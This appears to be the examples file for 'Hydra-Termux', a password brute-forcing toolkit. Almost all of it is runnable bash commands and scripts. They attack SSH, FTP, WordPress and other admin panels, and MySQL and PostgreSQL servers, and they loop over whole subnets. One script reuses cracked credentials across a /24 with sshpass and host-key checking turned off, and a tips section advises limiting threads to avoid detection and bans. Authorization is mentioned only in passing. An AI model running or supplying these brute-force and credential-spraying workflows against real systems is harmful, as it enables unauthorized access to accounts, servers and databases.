# Hydra-Termux Examples

Real-world usage examples and scenarios.

## Table of Contents

- [Basic Examples](#basic-examples)
- [Advanced Scenarios](#advanced-scenarios)
- [Network Penetration Testing](#network-penetration-testing)
- [Web Application Testing](#web-application-testing)
- [Database Testing](#database-testing)
- [Complete Workflows](#complete-workflows)

## Basic Examples

### Example 1: Basic SSH Attack

Target: Home router with SSH enabled

```bash
# Quick attack with default settings
bash scripts/ssh_admin_attack.sh -t 192.168.1.1

# With custom port and verbose output
bash scripts/ssh_admin_attack.sh -t 192.168.1.1 -p 2222 -v
```

**Expected Output:**
```
╔════════════════════════════════════════════════════════════╗
║                      SSH Admin Attack                      ║
╚════════════════════════════════════════════════════════════╝

ℹ️  Target: 192.168.1.1:22
ℹ️  Threads: 16
⏳ Testing passwords...
✅ Valid credentials found: admin:password123
✅ Credentials saved to logs
```

### Example 2: FTP Server Attack

Target: FTP server on local network

```bash
# Basic FTP attack
bash scripts/ftp_admin_attack.sh -t 192.168.1.50

# With custom wordlist
bash scripts/ftp_admin_attack.sh -t 192.168.1.50 \
  -w ~/wordlists/ftp_passwords.txt
```

### Example 3: Web Admin Panel

Target: WordPress site

```bash
# Auto-detect admin panel
bash scripts/web_admin_attack.sh -t example.com -s

# Specific WordPress attack
bash scripts/web_admin_attack.sh -t example.com \
  -P /wp-login.php \
  -s \
  -v
```

## Advanced Scenarios

### Scenario 1: Corporate Network Assessment

**Objective:** Test security of corporate network with authorization

**Step 1: Reconnaissance**
```bash
# Full network scan
bash scripts/target_scanner.sh -t 192.168.10.0/24 -s full
```

**Step 2: Identify Services**
```bash
# Review scan results
cat results/scan_192_168_10_0_24_*.txt
```

**Step 3: Targeted Attacks**
```bash
# Attack SSH servers
bash scripts/ssh_admin_attack.sh -t 192.168.10.100 -T 8

# Attack FTP servers
bash scripts/ftp_admin_attack.sh -t 192.168.10.101

# Attack web servers
bash scripts/web_admin_attack.sh -t 192.168.10.102 -s
```

**Step 4: Review Results**
```bash
# View all successful attacks
bash scripts/results_viewer.sh --all

# Export for report
bash scripts/results_viewer.sh --export audit_report.csv --format csv
```

### Scenario 2: Multi-Target Campaign

**Objective:** Test multiple servers efficiently

```bash
# Create target list
cat > targets.txt << EOF
192.168.1.100
192.168.1.101
192.168.1.102
EOF

# Automated loop
while read target; do
    echo "Testing $target..."
    bash scripts/admin_auto_attack.sh -t "$target" -s fast
    sleep 30
done < targets.txt

# Consolidate results
bash scripts/results_viewer.sh --all --export final_results.json --format json
```

### Scenario 3: Custom Wordlist Attack

**Objective:** Create targeted wordlist based on company info

```bash
# Step 1: Create base wordlist with company-specific terms
cat > company_base.txt << EOF
CompanyName2024
CompanyName123
Admin2024
Welcome2024
EOF

# Step 2: Generate variants
bash scripts/wordlist_generator.sh \
  --input company_base.txt \
  --output company_variants.txt

# Step 3: Combine with common passwords
bash scripts/wordlist_generator.sh \
  --combine \
  --input company_variants.txt,~/wordlists/common_passwords.txt \
  --output final_wordlist.txt

# Step 4: Remove duplicates and sort
bash scripts/wordlist_generator.sh \
  --dedupe \
  --input final_wordlist.txt \
  --output clean_wordlist.txt

# Step 5: Use in attack
bash scripts/ssh_admin_attack.sh -t 192.168.1.100 \
  -w clean_wordlist.txt
```

## Network Penetration Testing

### Example 4: Internal Network Test

**Scenario:** Authorized penetration test of internal network

```bash
# Phase 1: Reconnaissance
echo "=== Phase 1: Reconnaissance ==="
bash scripts/target_scanner.sh -t 10.0.0.0/24 -s aggressive

# Phase 2: Service Enumeration
echo "=== Phase 2: Service Enumeration ==="
# Review scan results
cat results/scan_10_0_0_0_24_*.txt | grep "open"

# Phase 3: Vulnerability Assessment
echo "=== Phase 3: Automated Attack ==="
bash scripts/admin_auto_attack.sh -t 10.0.0.50 -r

# Phase 4: Reporting
echo "=== Phase 4: Generate Report ==="
bash scripts/results_viewer.sh --export pentest_report.csv --format csv
```

### Example 5: DMZ Server Testing

**Target:** Web server in DMZ

```bash
# Step 1: Port scan
bash scripts/target_scanner.sh -t dmz-server.company.com \
  -s full \
  -f xml

# Step 2: Web application attack
bash scripts/web_admin_attack.sh -t dmz-server.company.com \
  -P /admin \
  -s \
  -T 32

# Step 3: If SSH is open
bash scripts/ssh_admin_attack.sh -t dmz-server.company.com

# Step 4: Document findings
bash scripts/results_viewer.sh --target dmz-server.company.com
```

## Web Application Testing

### Example 6: WordPress Site Audit

**Target:** WordPress site security assessment

```bash
# Step 1: Detect WordPress
curl -s http://example.com | grep "wp-content"

# Step 2: Find login page
bash scripts/web_admin_attack.sh -t example.com -s

# Step 3: Custom username list
cat > wp_users.txt << EOF
admin
administrator
wpuser
editor
author
EOF

# Step 4: Attack with custom users
bash scripts/web_admin_attack.sh -t example.com \
  -P /wp-login.php \
  -u wp_users.txt \
  -w ~/wordlists/common_passwords.txt \
  -s \
  -v

# Step 5: Review results
bash scripts/results_viewer.sh --protocol http
```

### Example 7: Multiple Admin Panels

**Target:** Server with multiple admin interfaces

```bash
# Common admin paths
PATHS=(
    "/admin"
    "/administrator"
    "/wp-admin"
    "/phpmyadmin"
    "/cpanel"
    "/webmail"
)

# Test each path
for path in "${PATHS[@]}"; do
    echo "Testing $path..."
    bash scripts/web_admin_attack.sh -t example.com -P "$path"
    sleep 5
done
```

## Database Testing

### Example 8: MySQL Server Assessment

**Target:** MySQL database server

```bash
# Step 1: Check if MySQL is accessible
nmap -p 3306 192.168.1.200

# Step 2: Brute force attack
bash scripts/mysql_admin_attack.sh -t 192.168.1.200 -v

# Step 3: If successful, test connection
# (credentials found: root:password123)
mysql -h 192.168.1.200 -u root -ppassword123 -e "SHOW DATABASES;"
```

### Example 9: PostgreSQL Testing

**Target:** PostgreSQL database

```bash
# Step 1: Attack default database
bash scripts/postgres_admin_attack.sh -t 192.168.1.201

# Step 2: Try specific databases
for db in postgres template1 myapp; do
    echo "Testing database: $db"
    bash scripts/postgres_admin_attack.sh -t 192.168.1.201 -d "$db"
done

# Step 3: Document findings
bash scripts/results_viewer.sh --protocol postgresql
```

## Complete Workflows

### Workflow 1: Complete Network Security Audit

**Full security assessment workflow**

```bash
#!/bin/bash
# complete_audit.sh

TARGET_NETWORK="192.168.1.0/24"
OUTPUT_DIR="audit_$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"

echo "=== Starting Complete Security Audit ==="
echo "Target: $TARGET_NETWORK"
echo "Output: $OUTPUT_DIR"
echo ""

# Phase 1: Network Discovery
echo "[1/5] Network Discovery..."
bash scripts/target_scanner.sh -t "$TARGET_NETWORK" \
  -s aggressive \
  -o "$OUTPUT_DIR"

# Phase 2: Service Enumeration
echo "[2/5] Service Enumeration..."
# Parse scan results to get live hosts
grep "Nmap scan report" "$OUTPUT_DIR"/scan_* | \
  awk '{print $5}' > "$OUTPUT_DIR/live_hosts.txt"

# Phase 3: Automated Attacks
echo "[3/5] Automated Attacks..."
while read host; do
    echo "  Attacking $host..."
    bash scripts/admin_auto_attack.sh -t "$host" -s fast
    sleep 10
done < "$OUTPUT_DIR/live_hosts.txt"

# Phase 4: Results Compilation
echo "[4/5] Compiling Results..."
bash scripts/results_viewer.sh --all \
  --export "$OUTPUT_DIR/results.csv" \
  --format csv

bash scripts/results_viewer.sh --all \
  --export "$OUTPUT_DIR/results.json" \
  --format json

# Phase 5: Report Generation
echo "[5/5] Generating Report..."
cat > "$OUTPUT_DIR/REPORT.md" << EOF
# Security Audit Report

**Date:** $(date)
**Target:** $TARGET_NETWORK
**Auditor:** $(whoami)

## Summary

- Total Hosts Scanned: $(wc -l < "$OUTPUT_DIR/live_hosts.txt")
- Vulnerabilities Found: $(grep -c "SUCCESS" logs/*.log)

## Detailed Results

See attached files:
- results.csv - Detailed findings
- results.json - Machine-readable results
- scan_*.txt - Port scan results

## Recommendations

[Add your recommendations here]
EOF

echo ""
echo "=== Audit Complete ==="
echo "Results saved to: $OUTPUT_DIR"
```

**Run the workflow:**
```bash
chmod +x complete_audit.sh
./complete_audit.sh
```

### Workflow 2: Continuous Monitoring

**Set up continuous security monitoring**

```bash
#!/bin/bash
# continuous_monitor.sh

TARGETS_FILE="monitor_targets.txt"
CHECK_INTERVAL=3600  # 1 hour

while true; do
    echo "=== Security Check: $(date) ==="
    
    while read target; do
        # Quick check
        bash scripts/target_scanner.sh -t "$target" -s quick
        
        # If changes detected, alert
        # (implement your alert mechanism)
        
    done < "$TARGETS_FILE"
    
    echo "Next check in $CHECK_INTERVAL seconds..."
    sleep $CHECK_INTERVAL
done
```

### Workflow 3: Credential Validation

**Validate found credentials across multiple services**

```bash
#!/bin/bash
# validate_credentials.sh

# Extract credentials from results
bash scripts/results_viewer.sh --all --export found_creds.json --format json

# Test SSH credentials on other hosts
jq -r '.[] | select(.protocol == "ssh") | .username + ":" + .password' \
  found_creds.json | while IFS=: read user pass; do
    
    echo "Testing $user:$pass on other hosts..."
    
    # Test on other known SSH servers
    for host in 192.168.1.{1..254}; do
        timeout 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
          "$user@$host" "echo 'Success'" 2>/dev/null && \
          echo "Valid on $host: $user:$pass"
    done
done
```

## Tips for Success

### 1. Start Small
```bash
# Test one target first
bash scripts/ssh_admin_attack.sh -t 192.168.1.100

# Then expand to network
bash scripts/admin_auto_attack.sh -t 192.168.1.0/24
```

### 2. Use Verbose Mode for Troubleshooting
```bash
bash scripts/ssh_admin_attack.sh -t 192.168.1.100 -v
```

### 3. Save and Resume
```bash
# Start attack
bash scripts/ssh_admin_attack.sh -t 192.168.1.100

# Resume if interrupted
bash scripts/ssh_admin_attack.sh -t 192.168.1.100 --resume
```

### 4. Monitor Progress
```bash
# In another terminal
tail -f logs/hydra_$(date +%Y%m%d).log
```

### 5. Batch Processing
```bash
# Process multiple targets efficiently
parallel -j 4 bash scripts/ssh_admin_attack.sh -t {} :::: targets.txt
```

## Common Mistakes to Avoid

1. **Don't use too many threads** - Can cause detection and bans
2. **Don't skip reconnaissance** - Scan before attacking
3. **Don't attack without permission** - Always get authorization
4. **Don't use default wordlists only** - Create custom lists
5. **Don't ignore rate limiting** - Can cause account lockouts

## See Also

- [USAGE.md](USAGE.md) - Detailed usage guide
- [README.md](../README.md) - Main documentation
- [CONTRIBUTING.md](../CONTRIBUTING.md) - Contributing guide
